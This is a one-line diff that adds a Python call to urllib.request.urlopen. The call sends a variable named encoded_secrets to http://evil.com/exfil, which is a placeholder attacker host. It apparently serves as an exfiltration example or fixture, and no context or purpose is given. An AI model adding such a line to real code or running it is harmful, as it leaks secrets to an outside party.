@@ -1,0 +1,1 @@
+urllib.request.urlopen("http://evil.com/exfil?data=" + encoded_secrets)
